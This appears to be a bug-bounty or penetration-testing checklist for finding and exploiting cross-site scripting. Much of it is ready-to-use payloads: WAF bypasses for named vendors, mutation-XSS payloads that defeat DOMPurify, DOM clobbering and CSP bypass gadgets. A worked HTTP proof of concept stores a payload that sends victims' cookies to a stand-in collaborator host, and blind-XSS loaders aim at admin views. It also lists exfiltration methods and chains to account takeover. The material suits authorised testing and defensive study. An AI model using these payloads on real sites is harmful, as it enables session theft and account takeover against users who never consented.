# Cross-Site Scripting (XSS)

**What it is:** Injected script runs in a victim's browser in the app's origin → session theft, actions as victim, defacement.

## Types
- **Reflected** — payload in request echoed into response.
- **Stored** — payload saved (profile, comment, filename) fires for other users.
- **DOM** — client JS writes attacker-controlled source into a sink (`innerHTML`, `eval`, `document.write`).

## Where to look
Search boxes, error messages, profile fields, comments/reviews, filenames, `Referer`/`User-Agent` reflected, URL fragments, JSON reflected into HTML, redirect params, PDF/email generators.

## Detection
- [ ] Reflect a unique marker `xss7391` → find it in response, note the context (HTML body / attribute / JS string / URL / CSS).
- [ ] Break the context:
```
HTML body:      <script>alert(document.domain)</script>
Attribute:      "><img src=x onerror=alert(document.domain)>
JS string:      ';alert(document.domain);//   or  </script><svg onload=...>
Event/URL:      javascript:alert(document.domain)
Template:       {{7*7}} (could be SSTI, see 03)
```
- [ ] DOM: trace sources (`location`, `document.referrer`, `postMessage`) → sinks in JS.

## Filter/WAF bypass
- Case, no-space (`<svg/onload=...>`), no-parens (`onerror=alert\`1\``), HTML entities, `<iMg`, `srcdoc`, unicode, double encoding, `<details open ontoggle=>`.
- CSP: look for `unsafe-inline`, JSONP endpoints, whitelisted CDNs hosting gadget libs, `base-uri` missing.

## Vendor WAF-specific bypass (real-world payloads)
Fingerprint the WAF first, then use its known blind spot:
- **Imperva/Incapsula:** unicode-escape the handler body — `<img/src="x"/onerror="prompt()">`; backslash-escape inside event handlers.
- **ModSecurity:** stuff hundreds of newlines/tabs mid-attribute (`<a href="j[\n\t...]avascript:alert(1)">`); fraction chars `¼script¾alert()¼/script¾`.
- **F5 BIG-IP:** rarer handlers/tags — `<body style="height:1000px" onwheel="alert(1)">`, `<menu id=x onshow="alert(1)">`.
- **Akamai:** null-byte inside the tag name — `<SCr%00Ipt>confirm(1)</scR%00ipt>`.
- **JSON→HTML reroute:** `.json//%3Csvg.html` on an endpoint that reflects into JSON but is re-parsed as HTML by extension.

## Modern sanitizer / WAF bypass (2025)
- [ ] **mXSS (mutation XSS)** — when input passes a sanitizer (DOMPurify) but the browser *mutates* the DOM on re-parse into script. Namespace-confusion payloads using `<math>`/`<svg>` + `<style>`/comment tricks have repeatedly bypassed DOMPurify:
```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```
  Check the exact DOMPurify version against known bypasses.
- [ ] **DOM clobbering** — inject named elements to overwrite JS globals/config where CSP blocks inline script:
```html
<a id=x><a id=x name=y href="javascript:alert(1)">   <!-- x.y becomes the anchor -->
<form id=config><input name=isAdmin value=1>
```
- [ ] **WAF parser discrepancy (WAFFLED-style)** — the WAF and the browser parse HTML/multipart differently; malformed tags/attributes/encodings slip the payload past the WAF but the browser still runs it. Fragment the payload, use uncommon-but-valid HTML.
- [ ] **DOM XSS invisible to WAF** — pure client-side sink→source never hits the server; a WAF sees nothing. Always test DOM paths separately.
- [ ] **Emerging sinks:** Service Worker registration, `import maps`, WASM, framework template injection (Angular/Vue) — context-aware payloads per framework.

## Confirm safely
Use `alert(document.domain)` or `console.log` / OOB beacon to Collaborator. Do **not** run destructive JS on other users.

## Impact
Session/cookie theft, account takeover, keylogging, CSRF-token theft, worm (stored).

## Tools
Burp, `dalfox`, `XSStrike`, `kxss`, Collaborator/interactsh for blind XSS.

## 🎯 PoC — Request → Response

**Stored XSS in a profile field returned raw by the API + rendered by the SPA:**
```http
PATCH /api/v2/users/self/profile HTTP/2
Host: api.target.com
Authorization: Bearer <mine>
Content-Type: application/json

{"bio":"<img src=x onerror=fetch('https://COLLAB/c?'+document.cookie)>"}
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"bio":"<img src=x onerror=fetch('https://COLLAB/c?'+document.cookie)>"}
```
Server stored it unescaped. Fetch the public profile:
```http
GET /u/alex HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK
Content-Type: text/html

...<div class="bio"><img src=x onerror=fetch('https://COLLAB/c?'+document.cookie)></div>...
```
Payload lands in HTML on the app origin → fires for every viewer.

## Deep cuts — surfaces, CSP gadgets, and exfil
- [ ] **Blind XSS (fire-and-wait):** plant a `<script src=//COLLAB/x></script>` / `"><img src=x onerror=import('//COLLAB')>` in fields that render in a **privileged** view you can't see — support tickets, admin user-lists, audit logs, `User-Agent`/`Referer` logged to a dashboard, invoice/PDF names, HR/CRM notes. Use `xsshunter`/interactsh; a callback = XSS in staff context = near-ATO.
- [ ] **CSP bypass gadgets:** `unsafe-inline`/`unsafe-eval`; a whitelisted CDN hosting a known gadget (AngularJS `ng-app` on `cdnjs`, `angular.min.js`, Vue); JSONP endpoint on an allowed origin (`/api/jsonp?callback=`); missing `base-uri` → `<base href>` hijack; `object-src` unset → `<object data>`; nonce reuse/predictable; `script-src 'self'` + an open upload/JSON-reflection on-origin.
- [ ] **DOM sinks beyond innerHTML:** `location`/`location.href` assign to `javascript:`, `setTimeout`/`setInterval` string, `Function()`, `.setAttribute('href'|'srcdoc'|'formaction')`, `jQuery('#'+hash)`, `Element.insertAdjacentHTML`, `Range.createContextualFragment`, template engines (`{{}}` client-side = CSTI).
- [ ] **Sanitizer/version-specific bypass:** identify DOMPurify/sanitize-html version from JS → match a known bypass (mXSS `<math>/<svg>` namespace confusion, `<template>`, `<noscript>` re-parse, `<style>` comment split). Also `xlink:href` on `<use>`, `<svg><animate onbegin=>`.
- [ ] **Markup-context specials:** `<iframe srcdoc="&lt;script&gt;...">`, `<form>` + `formaction`, `<input autofocus onfocus=>`, `<details open ontoggle=>`, `srcset`/`ping`, `<svg><script>` (XML rules differ).
- [ ] **Exfil without inline fetch:** `navigator.sendBeacon`, `new Image().src=`, `fetch` with `mode:no-cors`, WebSocket, DNS-prefetch, CSS `background:url()` (dangling markup, `09-advanced/05`) — pick one the CSP allows.
- [ ] **Reflected in non-HTML that becomes HTML:** JSON/XML error pages, `Content-Type: text/plain` sniffed as HTML (old IE/edge cases), SVG served inline, `.md` rendered.
- [ ] **Prototype-pollution → XSS gadget:** pollute `__proto__` then a sink reads the polluted config/`innerHTML` template (`09-advanced/02`).
- [ ] **Chain it:** stored XSS in app origin → steal token/CSRF, force email/password change → ATO (`09-advanced/07`). A raw `alert()` is P3; the chain is P1.

## Report notes
Show it firing (screenshot `alert(document.domain)`), state stored vs reflected vs DOM, name the context + any CSP you bypassed, and the impact (session theft / privileged-context blind XSS / ATO chain).
